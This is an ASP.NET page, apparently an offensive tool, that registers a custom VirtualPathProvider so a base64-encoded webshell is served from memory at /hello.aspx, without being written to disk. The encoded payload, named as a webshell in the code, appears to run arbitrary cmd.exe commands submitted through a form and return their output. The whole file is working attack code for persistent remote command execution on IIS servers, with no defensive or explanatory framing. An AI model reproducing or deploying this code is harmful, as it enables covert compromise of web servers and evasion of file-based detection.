<%@ Page Language="C#" EnableTheming="False" StylesheetTheme="" Theme=""%>
<%@ import Namespace="System.Web.Hosting" %>
<%@ import Namespace="System.IO" %>
<%@ import Namespace="System.Web" %>

<script runat="server">
public class SamplePathProvider : System.Web.Hosting.VirtualPathProvider
    {
        private string _virtualDir;
        private string _fileContent;

        public SamplePathProvider(string virtualDir, string fileContent)
            : base()
        {
            _virtualDir = virtualDir;
            _fileContent = fileContent;
        }

        private bool IsPathVirtual(string virtualPath)
        {
            System.String checkPath = System.Web.VirtualPathUtility.ToAppRelative(virtualPath);
            return checkPath.ToLower().Contains(_virtualDir.ToLower());
        }

        public override bool FileExists(string virtualPath)
        {
            if (IsPathVirtual(virtualPath))
            {
                return true;
            }
            else
            {
                return Previous.FileExists(virtualPath);
            }
        }


        public override System.Web.Hosting.VirtualFile GetFile(string virtualPath)
        {
            if (IsPathVirtual(virtualPath))
                return new SampleVirtualFile(virtualPath, _fileContent);
            else
                return Previous.GetFile(virtualPath);
        }	
		
    }

    public class SampleVirtualFile : System.Web.Hosting.VirtualFile
    {
        private string _fileContent;

        public bool Exists
        {
            get { return true; }
        }

        public SampleVirtualFile(string virtualPath, string fileContent)
            : base(virtualPath)
        {
            this._fileContent = fileContent;
        }

        public override System.IO.Stream Open()
        {
            System.IO.Stream stream = new System.IO.MemoryStream(System.Text.Encoding.UTF8.GetBytes(_fileContent));
            return stream;
        }
    }



protected void Page_Load(object sender, EventArgs e)
  {
  
    string webshellContentsBase64 = "PCVAIFBhZ2UgTGFuZ3VhZ2U9IkMjIiBFbmFibGVUaGVtaW5nPSJGYWxzZSIgU3R5bGVzaGVldFRoZW1lPSIiIFRoZW1lPSIiJT4KPCVAIEltcG9ydCBOYW1lc3BhY2U9IlN5c3RlbS5EaWFnbm9zdGljcyIgJT4KPCVAIEltcG9ydCBOYW1lc3BhY2U9IlN5c3RlbS5JTyIgJT4KPHNjcmlwdCBMYW5ndWFnZT0iYyMiIHJ1bmF0PSJzZXJ2ZXIiPgp2b2lkIFBhZ2VfTG9hZChvYmplY3Qgc2VuZGVyLCBFdmVudEFyZ3MgZSkKewp9CnN0cmluZyBFeGN1dGVDbWQoc3RyaW5nIGFyZykKewpQcm9jZXNzU3RhcnRJbmZvIHBzaSA9IG5ldyBQcm9jZXNzU3RhcnRJbmZvKCk7CnBzaS5GaWxlTmFtZSA9ICJjbWQuZXhlIjsKcHNpLkFyZ3VtZW50cyA9ICIvYyAiK2FyZzsKcHNpLlJlZGlyZWN0U3RhbmRhcmRPdXRwdXQgPSB0cnVlOwpwc2kuVXNlU2hlbGxFeGVjdXRlID0gZmFsc2U7ClByb2Nlc3MgcCA9IFByb2Nlc3MuU3RhcnQocHNpKTsKU3RyZWFtUmVhZGVyIHN0bXJkciA9IHAuU3RhbmRhcmRPdXRwdXQ7CnN0cmluZyBzID0gc3RtcmRyLlJlYWRUb0VuZCgpOwpzdG1yZHIuQ2xvc2UoKTsKcmV0dXJuIHM7Cn0Kdm9pZCBjbWRFeGVfQ2xpY2sob2JqZWN0IHNlbmRlciwgU3lzdGVtLkV2ZW50QXJncyBlKQp7ClJlc3BvbnNlLldyaXRlKCI8cHJlPiIpOwpSZXNwb25zZS5Xcml0ZShTZXJ2ZXIuSHRtbEVuY29kZShFeGN1dGVDbWQodHh0QXJnLlRleHQpKSk7ClJlc3BvbnNlLldyaXRlKCI8L3ByZT4iKTsKUmVzcG9uc2UuV3JpdGUoIjwvcHJlPiIpOwp9Cjwvc2NyaXB0Pgo8SFRNTD4KPEhFQUQ+CjwvSEVBRD4KPGJvZHkgPgo8Zm9ybSBpZD0iY21kIiBtZXRob2Q9InBvc3QiIHJ1bmF0PSJzZXJ2ZXIiPgo8YXNwOlRleHRCb3ggaWQ9InR4dEFyZyIgc3R5bGU9IlotSU5ERVg6IDEwMTsgTEVGVDogNDA1cHg7IFBPU0lUSU9OOiBhYnNvbHV0ZTsgVE9QOiAyMHB4IiBydW5hdD0ic2VydmVyIiBXaWR0aD0iMjUwcHgiPjwvYXNwOlRleHRCb3g+Cjxhc3A6QnV0dG9uIGlkPSJ0ZXN0aW5nIiBzdHlsZT0iWi1JTkRFWDogMTAyOyBMRUZUOiA2NzVweDsgUE9TSVRJT046IGFic29sdXRlOyBUT1A6IDE4cHgiIHJ1bmF0PSJzZXJ2ZXIiIFRleHQ9ImV4Y3V0ZSIgT25DbGljaz0iY21kRXhlX0NsaWNrIj48L2FzcDpCdXR0b24+Cjxhc3A6TGFiZWwgaWQ9ImxibFRleHQiIHN0eWxlPSJaLUlOREVYOiAxMDM7IExFRlQ6IDMxMHB4OyBQT1NJVElPTjogYWJzb2x1dGU7IFRPUDogMjJweCIgcnVuYXQ9InNlcnZlciI+Q29tbWFuZDo8L2FzcDpMYWJlbD4KPC9mb3JtPgo8L2JvZHk+CjwvSFRNTD4=";
    string webshellContent = System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(webshellContentsBase64));
    string targetVirtualPath = "/hello.aspx";
    SamplePathProvider sampleProvider = new SamplePathProvider(targetVirtualPath, webshellContent);
    HostingEnvironment.RegisterVirtualPathProvider(sampleProvider);
    sampleProvider.InitializeLifetimeService();
  }
</script>